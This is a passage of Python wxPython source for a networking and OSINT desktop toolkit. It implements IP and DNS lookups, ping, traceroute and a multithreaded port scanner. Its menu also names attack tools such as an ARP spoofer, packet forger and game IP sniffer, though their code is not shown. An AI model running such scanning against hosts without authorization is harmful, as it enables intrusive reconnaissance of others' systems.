        page_icon = self.image_list.Add(wx.Bitmap("icons/page.png", wx.BITMAP_TYPE_PNG))
        database_icon = self.image_list.Add(wx.Bitmap("icons/database_table.png", wx.BITMAP_TYPE_PNG))
        error_icon = self.image_list.Add(wx.Bitmap("icons/error.png", wx.BITMAP_TYPE_PNG))
        errorplus_icon = self.image_list.Add(wx.Bitmap("icons/error_go.png", wx.BITMAP_TYPE_PNG))
        drive_icon = self.image_list.Add(wx.Bitmap("icons/drive.png", wx.BITMAP_TYPE_PNG))
        drive_web_icon = self.image_list.Add(wx.Bitmap("icons/drive_web.png", wx.BITMAP_TYPE_PNG))
        drive_edit_icon = self.image_list.Add(wx.Bitmap("icons/drive_edit.png", wx.BITMAP_TYPE_PNG))
        rotate_icon = self.image_list.Add(wx.Bitmap("icons/rotate.png", wx.BITMAP_TYPE_PNG))
        attach_icon = self.image_list.Add(wx.Bitmap("icons/attach.png", wx.BITMAP_TYPE_PNG))
        basket_icon = self.image_list.Add(wx.Bitmap("icons/basket.png", wx.BITMAP_TYPE_PNG))
        basket_edit_icon = self.image_list.Add(wx.Bitmap("icons/basket_edit.png", wx.BITMAP_TYPE_PNG))
        report_icon = self.image_list.Add(wx.Bitmap("icons/cut_red.png", wx.BITMAP_TYPE_PNG))

        tools = self.sidebar.AddRoot("Tools", image=tools_icon)

        net_tools = self.sidebar.AppendItem(tools, "Networking Tools", image=ip_icon)
        self.sidebar.Expand(net_tools)
        self.sidebar.AppendItem(net_tools, "IP Lookup", image=page_icon)
        self.sidebar.AppendItem(net_tools, "DNS Lookup", image=page_icon)
        self.sidebar.AppendItem(net_tools, "NSLookup", image=page_icon)
        self.sidebar.AppendItem(net_tools, "Port Scanner", image=page_icon)
        self.sidebar.AppendItem(net_tools, "Ping Tool", image=page_icon)
        self.sidebar.AppendItem(net_tools, "Traceroute", image=page_icon)
        self.sidebar.AppendItem(net_tools, "Subnet Calculator", image=page_icon)
        self.sidebar.AppendItem(net_tools, "MAC Address Lookup", image=page_icon)
        self.sidebar.AppendItem(net_tools, "Reverse IP Lookup", image=page_icon)
        self.sidebar.AppendItem(net_tools, "SSL/TLS Checker", image=page_icon)
        self.sidebar.AppendItem(net_tools, "HTTP Header Viewer", image=page_icon)
        self.sidebar.AppendItem(net_tools, "WHOIS Lookup", image=page_icon)
        self.sidebar.AppendItem(net_tools, "IP Blacklist Checker", image=page_icon)
        self.sidebar.AppendItem(net_tools, "Cloudflare Scanner", image=page_icon)
        self.sidebar.AppendItem(net_tools, "Website2IP", image=page_icon)
        self.sidebar.AppendItem(net_tools, "Subdomain Scanner", image=page_icon)
        self.sidebar.AppendItem(net_tools, "IP Checker", image=page_icon)
        self.sidebar.AppendItem(net_tools, "IP Range Scanner", image=page_icon)#

        osint_tools = self.sidebar.AppendItem(tools, "OSINT Tools", image=magnifier_icon)
        self.sidebar.AppendItem(osint_tools, "Username Scanner", image=page_icon)
        self.sidebar.AppendItem(osint_tools, "Email Verifier", image=page_icon)
        self.sidebar.AppendItem(osint_tools, "Metadata Extractor", image=page_icon)
        self.sidebar.AppendItem(osint_tools, "Phone Number Lookup", image=page_icon)
        self.sidebar.AppendItem(osint_tools, "Pastebin Leak Search", image=page_icon)
        self.sidebar.AppendItem(osint_tools, "DNS Enumeration", image=page_icon)
        self.sidebar.AppendItem(osint_tools, "Google Dorking Helper", image=page_icon)

        discord_tools = self.sidebar.AppendItem(tools, "Discord Tools", image=drive_icon)
        self.sidebar.AppendItem(discord_tools, "Embed Creator", image=rotate_icon)

        misc_tools = self.sidebar.AppendItem(tools, "Misc Tools", image=wand_icon)
        self.sidebar.AppendItem(misc_tools, "Roblox Game IP Sniffer", image=page_icon)
        self.sidebar.AppendItem(misc_tools, "Hash Generator", image=page_icon)
        self.sidebar.AppendItem(misc_tools, "Base64 Encoder/Decoder", image=page_icon)
        self.sidebar.AppendItem(misc_tools, "UUID Generator", image=page_icon)
        self.sidebar.AppendItem(misc_tools, "Password Generator", image=page_icon)
        self.sidebar.AppendItem(misc_tools, "Text Encoder/Decoder", image=page_icon)
        self.sidebar.AppendItem(misc_tools, "Regex Tester", image=page_icon)
        self.sidebar.AppendItem(misc_tools, "Fake Identity Generator", image=page_icon)
        self.sidebar.AppendItem(misc_tools, "URL Scanner", image=page_icon)

        # system_tools = self.sidebar.AppendItem(tools, "System Tools", image=wand_icon)
        # self.sidebar.AppendItem(system_tools, "Script Runner", image=page_icon)
        # self.sidebar.AppendItem(system_tools, "Temp Data Remover", image=page_icon)
        # self.sidebar.AppendItem(system_tools, "File Incinerator", image=page_icon)

        # encryption_tools = self.sidebar.AppendItem(tools, "Encryption Tools", image=wand_icon)
        # self.sidebar.AppendItem(encryption_tools, "Steganography Tool", image=page_icon)

        # game_tools = self.sidebar.AppendItem(tools, "Game Tools", image=wand_icon)
        # self.sidebar.AppendItem(game_tools, "Game Server Ping Tool", image=page_icon)

        misc_tools = self.sidebar.AppendItem(tools, "Beta Tools", image=error_icon)
        self.sidebar.AppendItem(misc_tools, "Network interface", image=errorplus_icon)
        self.sidebar.AppendItem(misc_tools, "Raw Packet Forge", image=errorplus_icon)
        self.sidebar.AppendItem(misc_tools, "ARP Spoofer", image=errorplus_icon)
        self.sidebar.AppendItem(misc_tools, "WiFi Network Viewer", image=errorplus_icon)
        self.sidebar.AppendItem(misc_tools, "NetBIOS Scanner", image=errorplus_icon)
        self.sidebar.AppendItem(misc_tools, "HTML Comment Finder", image=errorplus_icon)

        self.sidebar.AppendItem(tools, "Database", image=database_icon)

        self.sidebar.Expand(tools)

    def on_mouse_move(self, event):
        item, flags = self.sidebar.HitTest(event.GetPosition())
        if item:
            text = self.sidebar.GetItemText(item)
            desc = self.tool_descriptions.get(text, "")
            self.statusbar.SetStatusText(desc if desc else "Hover over a tool to see its description...")
        else:
            self.statusbar.SetStatusText("Hover over a tool to see its description...")
        event.Skip()

    def on_tool_selected(self, event):
        item = event.GetItem()
        text = self.sidebar.GetItemText(item)

        # Ignore category nodes (not tools)
        if text in ["Tools", "Networking Tools", "OSINT Tools"]:
            return

        # Hide all panels
        for panel in self.tool_panels.values():
            panel.Hide()

        # Clear the sizer to remove any attached panels (but don't destroy them)
        self.content_sizer.Clear(False)

        # Create or show panel for this tool
        if text in self.tool_panels:
            panel = self.tool_panels[text]
        else:
            if text == "IP Lookup":
                panel = self.create_ip_lookup_panel()
            elif text == "DNS Lookup":
                panel = self.create_dns_lookup_panel()
            elif text == "NSLookup":
                panel = self.create_nslookup_panel()
            elif text == "Port Scanner":
                panel = self.create_port_scanner_panel()
            elif text == "Ping Tool":
                panel = self.create_ping_tool_panel()
            elif text == "Traceroute":
                panel = self.create_traceroute_panel()
            elif text == "Subnet Calculator":
                panel = self.create_subnet_calculator_panel()
            elif text == "MAC Address Lookup":
                panel = self.create_mac_lookup_panel()
            elif text == "Reverse IP Lookup":
                panel = self.create_reverse_ip_lookup_panel()
            elif text == "SSL/TLS Checker":
                panel = self.create_ssl_checker_panel()
            elif text == "HTTP Header Viewer":
                panel = self.create_http_header_viewer_panel()
            elif text == "WHOIS Lookup":
                panel = self.create_whois_lookup_panel()
            elif text == "IP Blacklist Checker":
                panel = self.create_ip_blacklist_checker_panel()
            elif text == "Cloudflare Scanner":
                panel = self.create_cloudflare_scanner_panel()
            elif text == "Website2IP":
                panel = self.create_website_to_ip_panel()
            elif text == "Subdomain Scanner":
                panel = self.create_subdomain_scanner_panel()
            elif text == "IP Checker":
                panel = self.create_ip_checker_panel()
            elif text == "IP Range Scanner":
                panel = self.create_ip_range_scanner_panel()

            elif text == "Embed Creator":
                panel = self.create_webhook_embed_panel()

            elif text == "Username Scanner":
                panel = self.create_username_scanner_panel()
            elif text == "Email Verifier":
                panel = self.create_email_verifier_panel()
            elif text == "Metadata Extractor":
                panel = self.create_metadata_extractor_panel()
            elif text == "Phone Number Lookup":
                panel = self.create_phone_lookup_panel()
            elif text == "Pastebin Leak Search":
                panel = self.create_pastebin_leak_tool()
            elif text == "DNS Enumeration":
                panel = self.create_dns_enum_panel()
            elif text == "Google Dorking Helper":
                panel = self.create_google_dork_helper_panel()

            elif text == "Roblox Game IP Sniffer":
                panel = self.create_roblox_sniffer_panel()
            elif text == "Hash Generator":
                panel = self.create_hash_generator_panel()
            elif text == "Base64 Encoder/Decoder":
                panel = self.create_base64_panel()
            elif text == "UUID Generator":
                panel = self.create_uuid_panel()
            elif text == "Password Generator":
                panel = self.create_password_generator_panel()
            elif text == "Text Encoder/Decoder":
                panel = self.create_text_encoder_decoder_panel()
            elif text == "Regex Tester":
                panel = self.create_regex_tester_panel()
            elif text == "Fake Identity Generator":
                panel = self.create_fake_identity_panel()
            elif text == "URL Scanner":
                panel = self.create_url_scan_panel()

            elif text == "Network interface":
                panel = self.create_network_info_panel()
            elif text == "Raw Packet Forge":
                panel = self.create_raw_packet_forge_panel()
            elif text == "ARP Spoofer":
                panel = self.create_arp_spoofer_panel()
            elif text == "WiFi Network Viewer":
                panel = self.create_wifi_viewer_panel()
            elif text == "NetBIOS Scanner":
                panel = self.create_netbios_scanner_panel()


            elif text == "Database":
                panel = self.create_info_database_panel()
            else:
                panel = self.create_placeholder_panel(text)

            self.tool_panels[text] = panel

        # Add and show the panel
        self.content_sizer.Add(panel, 1, wx.EXPAND)
        panel.Show()

        # Refresh layout
        self.content_panel.Layout()

    def create_ip_lookup_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        input_label = wx.StaticText(panel, label="Enter IP address:")
        self.ip_input = wx.TextCtrl(panel)

        input_sizer.Add(input_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.ip_input, 1, wx.ALL | wx.EXPAND, 5)

        self.lookup_button = wx.Button(panel, label="Lookup")
        input_sizer.Add(self.lookup_button, 0, wx.ALL | wx.ALIGN_CENTER_VERTICAL, 5)
        self.lookup_button.Bind(wx.EVT_BUTTON, self.on_ip_lookup_clicked)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Replace multiline text box with ListCtrl table for results
        self.ip_result_table = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        columns = ["Field", "Value"]
        for i, col in enumerate(columns):
            self.ip_result_table.InsertColumn(i, col)
            self.ip_result_table.SetColumnWidth(i, 150 if i == 0 else 350)

        sizer.Add(self.ip_result_table, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)
        return panel


    def on_ip_lookup_clicked(self, event):
        ip = self.ip_input.GetValue().strip()
        self.ip_result_table.DeleteAllItems()

        if not ip:
            wx.MessageBox("Please enter an IP address.", "Input Error", wx.OK | wx.ICON_ERROR)
            return

        try:
            # Example API: ipinfo.io
            response = requests.get(f"https://ipinfo.io/{ip}/json")
            if response.status_code != 200:
                raise Exception(f"API request failed with status {response.status_code}")

            data = response.json()

            # Define fields you want to show
            fields = [
                ("IP", data.get("ip", "N/A")),
                ("Hostname", data.get("hostname", "N/A")),
                ("City", data.get("city", "N/A")),
                ("Region", data.get("region", "N/A")),
                ("Country", data.get("country", "N/A")),
                ("Location (Lat,Long)", data.get("loc", "N/A")),
                ("Organization", data.get("org", "N/A")),
                ("Postal", data.get("postal", "N/A")),
                ("Timezone", data.get("timezone", "N/A")),
            ]

            for field_name, value in fields:
                idx = self.ip_result_table.InsertItem(self.ip_result_table.GetItemCount(), field_name)
                self.ip_result_table.SetItem(idx, 1, value)

        except Exception as e:
            wx.MessageBox(f"Lookup failed: {str(e)}", "Error", wx.OK | wx.ICON_ERROR)

    
    def create_dns_lookup_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        input_label = wx.StaticText(panel, label="Enter IP address:")
        self.ip_input = wx.TextCtrl(panel)

        input_sizer.Add(input_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.ip_input, 1, wx.ALL | wx.EXPAND, 5)

        self.lookup_button = wx.Button(panel, label="Lookup")
        input_sizer.Add(self.lookup_button, 0, wx.ALL | wx.ALIGN_CENTER_VERTICAL, 5)
        self.lookup_button.Bind(wx.EVT_BUTTON, self.on_lookup_clicked)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        self.result_text = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.result_text, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)
        return panel

    def on_lookup_clicked(self, event):
        ip = self.ip_input.GetValue().strip()
        if not ip:
            wx.MessageBox("Please enter an IP address.", "Error", wx.OK | wx.ICON_ERROR)
            return

        try:
            # Reverse DNS lookup (PTR record)
            try:
                reversed_dns = socket.gethostbyaddr(ip)[0]
            except socket.herror:
                reversed_dns = "No PTR record found"

            # Query DNS records (A, MX, NS) for the hostname if found
            dns_info = []
            if reversed_dns != "No PTR record found":
                for record_type in ['A', 'MX', 'NS']:
                    try:
                        answers = dns.resolver.resolve(reversed_dns, record_type)
                        records = ', '.join([str(rdata.to_text()) for rdata in answers])
                        dns_info.append(f"{record_type} records: {records}")
                    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers):
                        dns_info.append(f"{record_type} records: None found")

            # Prepare output
            output = f"IP Address: {ip}\n"
            output += f"Reverse DNS (PTR): {reversed_dns}\n\n"
            output += "\n".join(dns_info) if dns_info else "No DNS info found."

            self.result_text.SetValue(output)

        except Exception as e:
            self.result_text.SetValue(f"Error during lookup: {str(e)}")
    
    def create_nslookup_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        input_label = wx.StaticText(panel, label="Enter IP address or domain:")
        self.nslookup_input = wx.TextCtrl(panel)

        input_sizer.Add(input_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.nslookup_input, 1, wx.ALL | wx.EXPAND, 5)

        self.nslookup_button = wx.Button(panel, label="Lookup")
        input_sizer.Add(self.nslookup_button, 0, wx.ALL | wx.ALIGN_CENTER_VERTICAL, 5)
        self.nslookup_button.Bind(wx.EVT_BUTTON, self.on_nslookup_clicked)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Table for results: Field, Value
        self.nslookup_result_table = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        columns = ["Type", "Result"]
        for i, col in enumerate(columns):
            self.nslookup_result_table.InsertColumn(i, col)
            self.nslookup_result_table.SetColumnWidth(i, 150 if i == 0 else 350)

        sizer.Add(self.nslookup_result_table, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)
        return panel

    def on_nslookup_clicked(self, event):
        self.nslookup_result_table.DeleteAllItems()
        query = self.nslookup_input.GetValue().strip()

        if not query:
            wx.MessageBox("Please enter an IP address or domain.", "Input Error", wx.OK | wx.ICON_ERROR)
            return

        try:
            # Try reverse DNS lookup if input is an IP address
            try:
                socket.inet_aton(query)  # Validate if query is IP
                hostname = socket.gethostbyaddr(query)[0]
                self.add_nslookup_result("Hostname", hostname)
            except socket.error:
                # Otherwise treat input as domain and resolve IP(s)
                ips = socket.gethostbyname_ex(query)[2]
                for ip in ips:
                    self.add_nslookup_result("IP Address", ip)

            # Also do a normal DNS lookup for CNAME or aliases if needed (optional)

        except Exception as e:
            wx.MessageBox(f"Lookup failed: {str(e)}", "Error", wx.OK | wx.ICON_ERROR)

    def add_nslookup_result(self, field, value):
        idx = self.nslookup_result_table.InsertItem(self.nslookup_result_table.GetItemCount(), field)
        self.nslookup_result_table.SetItem(idx, 1, value)

    def create_port_scanner_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # ── Target IP ──────────────────────────────────────────────
        ip_sizer = wx.BoxSizer(wx.HORIZONTAL)
        ip_label = wx.StaticText(panel, label="Target IP:")
        self.ps_ip_input = wx.TextCtrl(panel)
        ip_sizer.Add(ip_label, 0, wx.ALL | wx.ALIGN_CENTER_VERTICAL, 5)
        ip_sizer.Add(self.ps_ip_input, 1, wx.ALL | wx.EXPAND, 5)
        sizer.Add(ip_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT | wx.TOP, 10)


        # ── Port selection row ────────────────────────────────────
        port_row = wx.BoxSizer(wx.HORIZONTAL)

        self.custom_chk = wx.CheckBox(panel, label="Custom Ports")
        self.custom_chk.Bind(wx.EVT_CHECKBOX, self.on_toggle_port_mode)
        port_row.Add(self.custom_chk, 0, wx.ALL | wx.ALIGN_CENTER_VERTICAL, 5)

        # custom list input
        self.custom_ports_in = wx.TextCtrl(panel)
        self.custom_ports_in.Enable(False)                        # disabled until checkbox ticked
        port_row.Add(self.custom_ports_in, 1, wx.ALL | wx.EXPAND, 5)

        # range inputs
        self.start_in = wx.TextCtrl(panel, size=(60, -1))
        self.end_in   = wx.TextCtrl(panel, size=(60, -1))
        port_row.Add(wx.StaticText(panel, label="Start:"), 0, wx.ALL | wx.ALIGN_CENTER_VERTICAL, 5)
        port_row.Add(self.start_in, 0, wx.ALL, 5)
        port_row.Add(wx.StaticText(panel, label="End:"),   0, wx.ALL | wx.ALIGN_CENTER_VERTICAL, 5)
        port_row.Add(self.end_in,   0, wx.ALL, 5)

        sizer.Add(port_row, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # ── Scan button ───────────────────────────────────────────
        btn_row = wx.BoxSizer(wx.HORIZONTAL)
        self.scan_btn = wx.Button(panel, label="Scan Ports")
        self.scan_btn.Bind(wx.EVT_BUTTON, self.on_start_port_scan)
        btn_row.AddStretchSpacer()
        btn_row.AddStretchSpacer()
        btn_row.Add(self.scan_btn, 0, wx.ALL, 5)
        sizer.Add(btn_row, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # ── Results table (wx.ListCtrl) ───────────────────────────
        self.result_tbl = wx.ListCtrl(panel,
                                      style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        self.result_tbl.InsertColumn(0, "Port",    width=70)
        self.result_tbl.InsertColumn(1, "Status",  width=90)
        self.result_tbl.InsertColumn(2, "Service", width=150)
        sizer.Add(self.result_tbl, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)
        return panel

    # ------------------------------------------------------------------
    #  Called when the “Custom Ports” checkbox is toggled
    # ------------------------------------------------------------------
    def on_toggle_port_mode(self, event):
        use_custom = self.custom_chk.IsChecked()
        self.custom_ports_in.Enable(use_custom)
        self.start_in.Enable(not use_custom)
        self.end_in.Enable(not use_custom)

    # ------------------------------------------------------------------
    #  Launch the scan in background threads
    # ------------------------------------------------------------------
    def on_start_port_scan(self, event):
        self.result_tbl.DeleteAllItems()           # clear previous results
        ip = self.ps_ip_input.GetValue().strip()
        if not ip:
            wx.MessageBox("Please enter a target IP / host.", "Input Error",
                          style=wx.OK | wx.ICON_ERROR)
            return

        # build the port list
        if self.custom_chk.IsChecked():
            try:
                ports = [int(p.strip()) for p in self.custom_ports_in.GetValue().split(',')
                         if p.strip()]
            except ValueError:
                wx.MessageBox("Custom ports must be comma-separated numbers.",
                              "Input Error", style=wx.OK | wx.ICON_ERROR)
                return
        else:
            try:
                start = int(self.start_in.GetValue())
                end   = int(self.end_in.GetValue())
                if start > end or start < 1 or end > 65535:
                    raise ValueError
                ports = list(range(start, end + 1))
            except ValueError:
                wx.MessageBox("Please enter a valid start/end port in 1-65535.",
                              "Input Error", style=wx.OK | wx.ICON_ERROR)
                return

        # spin up a thread per port
        for port in ports:
            t = threading.Thread(target=self.scan_single_port,
                                 args=(ip, port), daemon=True)
            t.start()

    # ------------------------------------------------------------------
    #  Worker thread: scan one port and update the table
    # ------------------------------------------------------------------
    def scan_single_port(self, ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1.0)
                status = "OPEN" if s.connect_ex((ip, port)) == 0 else "CLOSED"
        except Exception as exc:
            status = f"ERROR: {exc}"

        try:
            service = socket.getservbyport(port)
        except OSError:
            service = "unknown"

        # update ListCtrl safely from the GUI thread
        wx.CallAfter(self.result_tbl.Append,
                     [str(port), status, service])

    # ------------------------------------------------------------------
    #  Dummy handlers to satisfy the menu bar; update as needed
    # ------------------------------------------------------------------
    def on_save(self, event):    pass
    def on_save_as(self, event): pass
    def on_exit(self, event):    
        self.Close()

    def create_ping_tool_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # IP input row
        ip_sizer = wx.BoxSizer(wx.HORIZONTAL)
        ip_label = wx.StaticText(panel, label="Enter IP address:")
        self.ping_ip_input = wx.TextCtrl(panel)

        ip_sizer.Add(ip_label, 0, wx.ALL | wx.CENTER, 5)
        ip_sizer.Add(self.ping_ip_input, 1, wx.ALL | wx.EXPAND, 5)

        sizer.Add(ip_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT | wx.TOP, 10)

        # Packet size toggle and inputs
        packet_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.packet_toggle = wx.CheckBox(panel, label="Custom Packet Size")
        self.packet_size_spin = wx.SpinCtrl(panel, min=32, max=65500, initial=64)
        self.packet_size_spin.Enable(False)

        self.packet_toggle.Bind(wx.EVT_CHECKBOX, lambda evt: self.packet_size_spin.Enable(self.packet_toggle.GetValue()))

        packet_sizer.Add(self.packet_toggle, 0, wx.ALL | wx.CENTER, 5)
        packet_sizer.Add(wx.StaticText(panel, label="Size (bytes):"), 0, wx.ALL | wx.CENTER, 5)
        packet_sizer.Add(self.packet_size_spin, 0, wx.ALL, 5)

        sizer.Add(packet_sizer, 0, wx.LEFT | wx.RIGHT, 10)

        # Number of pings and toggle
        count_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.count_toggle = wx.CheckBox(panel, label="Fixed Count")
        self.count_spin = wx.SpinCtrl(panel, min=1, max=1000, initial=4)
        self.count_spin.Enable(False)

        self.count_toggle.Bind(wx.EVT_CHECKBOX, lambda evt: self.count_spin.Enable(self.count_toggle.GetValue()))

        count_sizer.Add(self.count_toggle, 0, wx.ALL | wx.CENTER, 5)
        count_sizer.Add(wx.StaticText(panel, label="Count:"), 0, wx.ALL | wx.CENTER, 5)
        count_sizer.Add(self.count_spin, 0, wx.ALL, 5)

        sizer.Add(count_sizer, 0, wx.LEFT | wx.RIGHT, 10)

        # Ping/Stop button
        self.ping_button = wx.Button(panel, label="Start Ping")
        self.ping_button.Bind(wx.EVT_BUTTON, self.on_ping_button)

        btn_sizer = wx.BoxSizer(wx.HORIZONTAL)
        btn_sizer.AddStretchSpacer()
        btn_sizer.Add(self.ping_button, 0, wx.ALL, 5)

        sizer.Add(btn_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Result text box
        self.ping_result_text = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.ping_result_text, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)
        return panel

    def on_ping_button(self, event):
        if not hasattr(self, "pinging") or not self.pinging:
            self.start_ping()
        else:
            self.stop_ping()

    def start_ping(self):
        import threading
        import subprocess

        self.pinging = True
        self.ping_button.SetLabel("Stop Ping")

        ip = self.ping_ip_input.GetValue()
        size = self.packet_size_spin.GetValue() if self.packet_toggle.GetValue() else 56
        count = self.count_spin.GetValue() if self.count_toggle.GetValue() else 0

        def run_ping():
            args = ["ping", ip]
            if count:
                args += ["-n" if wx.Platform == "__WXMSW__" else "-c", str(count)]
            if self.packet_toggle.GetValue():
                if wx.Platform == "__WXMSW__":
                    args += ["-l", str(size)]
                else:
                    args += ["-s", str(size)]

            proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self.ping_proc = proc
            for line in proc.stdout:
                if not self.pinging:
                    proc.terminate()
                    break
                wx.CallAfter(self.ping_result_text.AppendText, line)
            proc.wait()
            wx.CallAfter(self.ping_button.SetLabel, "Start Ping")
            self.pinging = False

        threading.Thread(target=run_ping).start()

    def stop_ping(self):
        self.pinging = False
        self.ping_button.SetLabel("Start Ping")
        if hasattr(self, "ping_proc"):
            self.ping_proc.terminate()

    def create_traceroute_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # IP/domain input row
        ip_sizer = wx.BoxSizer(wx.HORIZONTAL)
        ip_label = wx.StaticText(panel, label="Target IP/Domain:")
        self.traceroute_target_input = wx.TextCtrl(panel)
        ip_sizer.Add(ip_label, 0, wx.ALL | wx.CENTER, 5)
        ip_sizer.Add(self.traceroute_target_input, 1, wx.ALL | wx.EXPAND, 5)
        sizer.Add(ip_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT | wx.TOP, 10)

        # Options row with toggle
        options_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.custom_traceroute_checkbox = wx.CheckBox(panel, label="Custom Hops/Timeout")
        self.custom_traceroute_checkbox.Bind(wx.EVT_CHECKBOX, self.on_toggle_custom_traceroute)
        options_sizer.Add(self.custom_traceroute_checkbox, 0, wx.ALL | wx.ALIGN_CENTER_VERTICAL, 5)

        self.max_hops_spin = wx.SpinCtrl(panel, min=1, max=64, initial=30)
        self.max_hops_spin.Enable(False)
        options_sizer.Add(wx.StaticText(panel, label="Max Hops:"), 0, wx.ALL | wx.CENTER, 5)
        options_sizer.Add(self.max_hops_spin, 0, wx.ALL, 5)

        self.timeout_spin = wx.SpinCtrl(panel, min=1, max=10, initial=3)
        self.timeout_spin.Enable(False)
        options_sizer.Add(wx.StaticText(panel, label="Timeout (s):"), 0, wx.ALL | wx.CENTER, 5)
        options_sizer.Add(self.timeout_spin, 0, wx.ALL, 5)

        sizer.Add(options_sizer, 0, wx.LEFT | wx.RIGHT, 10)

        # Start/Stop button
        btn_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.traceroute_btn = wx.Button(panel, label="Start Traceroute")
        self.traceroute_btn.Bind(wx.EVT_BUTTON, self.on_traceroute_clicked)
        btn_sizer.AddStretchSpacer(1)
        btn_sizer.Add(self.traceroute_btn, 0, wx.ALL, 5)
        sizer.Add(btn_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Result output
        self.traceroute_output = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.traceroute_output, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)
        return panel

    def on_toggle_custom_traceroute(self, event):
        enabled = self.custom_traceroute_checkbox.IsChecked()
        self.max_hops_spin.Enable(enabled)
        self.timeout_spin.Enable(enabled)

    def on_traceroute_clicked(self, event):
        if self.traceroute_btn.GetLabel() == "Start Traceroute":
            self.traceroute_btn.SetLabel("Stop")
            self.traceroute_output.Clear()
            target = self.traceroute_target_input.GetValue()
            max_hops = self.max_hops_spin.GetValue() if self.custom_traceroute_checkbox.IsChecked() else 30
            timeout = self.timeout_spin.GetValue() if self.custom_traceroute_checkbox.IsChecked() else 3
            threading.Thread(target=self.run_traceroute, args=(target, max_hops, timeout), daemon=True).start()
        else:
            self.traceroute_stop_flag = True
            self.traceroute_btn.SetLabel("Start Traceroute")

    def run_traceroute(self, target, max_hops, timeout):
        self.traceroute_stop_flag = False
        for ttl in range(1, max_hops + 1):
            if self.traceroute_stop_flag:
                break
            try:
                proc = subprocess.Popen(
                    ["ping", target, "-n", "1", "-i", str(ttl), "-w", str(timeout * 1000)],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                )
                stdout, _ = proc.communicate(timeout=timeout + 2)
                wx.CallAfter(self.traceroute_output.AppendText, f"Hop {ttl}: {stdout}\n")
                if "TTL expired" not in stdout and "timed out" not in stdout:
                    break
            except Exception as e:
                wx.CallAfter(self.traceroute_output.AppendText, f"Hop {ttl}: Error - {str(e)}\n")
                break
        wx.CallAfter(self.traceroute_btn.SetLabel, "Start Traceroute")

    def create_subnet_calculator_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # IP input row
        ip_sizer = wx.BoxSizer(wx.HORIZONTAL)
        ip_label = wx.StaticText(panel, label="IP Address:")
        self.subnet_ip_input = wx.TextCtrl(panel)
        ip_sizer.Add(ip_label, 0, wx.ALL | wx.CENTER, 5)
        ip_sizer.Add(self.subnet_ip_input, 1, wx.ALL | wx.EXPAND, 5)
        sizer.Add(ip_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT | wx.TOP, 10)

        # Subnet mask input row
        mask_sizer = wx.BoxSizer(wx.HORIZONTAL)
        mask_label = wx.StaticText(panel, label="Subnet Mask (/24 or 255.255.255.0):")
        self.subnet_mask_input = wx.TextCtrl(panel)
        mask_sizer.Add(mask_label, 0, wx.ALL | wx.CENTER, 5)
        mask_sizer.Add(self.subnet_mask_input, 1, wx.ALL | wx.EXPAND, 5)
        sizer.Add(mask_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Calculate button
        btn_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.subnet_calc_btn = wx.Button(panel, label="Calculate")
        self.subnet_calc_btn.Bind(wx.EVT_BUTTON, self.on_subnet_calculate)
        btn_sizer.AddStretchSpacer(1)
        btn_sizer.Add(self.subnet_calc_btn, 0, wx.ALL, 10)
        sizer.Add(btn_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Output box
        self.subnet_result_text = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
